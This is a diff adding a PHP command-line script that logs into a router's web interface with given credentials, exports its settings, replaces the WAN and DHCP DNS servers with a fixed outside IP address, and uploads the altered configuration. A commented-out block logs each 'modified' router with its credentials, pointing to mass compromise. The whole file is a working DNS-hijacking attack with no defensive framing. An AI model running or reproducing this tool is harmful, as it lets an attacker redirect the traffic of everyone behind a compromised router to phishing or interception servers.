@@ -1,0 +1,92 @@
+#!/usr/bin/php -H
+<?php
+
+error_reporting(NULL);
+ini_set("display_errors", 0);
+
+$DNS1 = "167.114.17.149";
+$DNS2 = "8.8.4.4";
+
+$HOSTNAME = $argv[1];
+$USERNAME = $argv[2];
+$PASSWORD = $argv[3];
+$AUTH = $USERNAME . ":" . $PASSWORD;
+
+$URL = "http://" . $HOSTNAME . "/cgi-bin/ExportSettings.sh";
+
+$chopts = array(
+        CURLOPT_URL=>$URL,
+        CURLOPT_PORT=>80,
+        CURLOPT_TIMEOUT=>5,
+        CURLOPT_RETURNTRANSFER=>true,
+        CURLOPT_USERPWD=>$AUTH);
+
+$ch = curl_init();
+curl_setopt_array($ch, $chopts);
+$cfgFile = curl_exec($ch);
+$newCfg = array();
+
+$cfgLines = explode(PHP_EOL, $cfgFile);
+foreach($cfgLines as $cfgLine) {
+	if($cfgOpt = explode('=', $cfgLine)) {
+		if($cfgOpt[1] == '')
+			array_push($newCfg, "$cfgLine");
+		else {
+			switch($cfgOpt[0]) {
+				case "wan_primary_dns": array_push($newCfg, "wan_primary_dns=$DNS1"); break;
+				case "wan_secondary_dns": array_push($newCfg, "wan_secondary_dns=$DNS2"); break;
+				case "dhcpPriDns": array_push($newCfg, "dhcpPriDns=$DNS1"); break;
+				case "dhcpSecDns": array_push($newCfg, "dhcpSecDns=$DNS2"); break;
+				case "dnsPEnabled": array_push($newCfg, "dnsPEnabled=1"); break;
+				default: array_push($newCfg, $cfgOpt[0] . '=' . $cfgOpt[1]);
+			}
+		}
+		fseek($tmpFile, 0);
+	}
+}
+
+$newCfgData = NULL;
+foreach($newCfg as $newCfgLine) {
+	if($newCfgLine == '')
+		$newCfgData .= "\n";
+	else
+		$newCfgData .= "$newCfgLine\n";
+}
+
+$tmpFile = tmpfile();
+fwrite($tmpFile, $newCfgData);
+fseek($tmpFile, 0);
+
+$URL2 = "http://" . $HOSTNAME . "/cgi-bin/upload_settings.cgi";
+$chopts2 = array(
+	CURLOPT_URL            => $URL2,
+	CURLOPT_POST           => true,
+	CURLOPT_POSTFIELDS     => "filename=config.dat",
+	CURLOPT_RETURNTRANSFER => true,
+	CURLOPT_FOLLOWLOCATION => true,
+	CURLOPT_HTTPHEADER     => array('Content-type: multipart/form-data'),
+	//CURLOPT_PUT            => true,
+    //CURLOPT_INFILE         => $tmpFile,
+	//CURLOPT_INFILESIZE     => strlen($newCfgData),
+	CURLOPT_USERPWD        => $AUTH
+);
+$ch2 = @curl_init();
+curl_setopt_array($ch2, $chopts2);
+$res2 = @curl_exec($ch2);
+
+echo "$res2\n";
+
+@curl_close($ch);
+@curl_close($ch2);
+@fclose($tmpFile);
+
+/*
+echo "[+] modificado -> http://$HOSTNAME ($AUTH) [GoAheads]\n";
+$logFile = "logs/modificados.log";
+$logText = "http://$HOSTNAME ($AUTH) [GoAheads]\n";
+$logHandler = fopen($logFile, 'a') or die("[!] can't open log file: $logFile");
+@fwrite($logHandler, $logText);
+@fclose($logHandler);
+ */
+
+?>
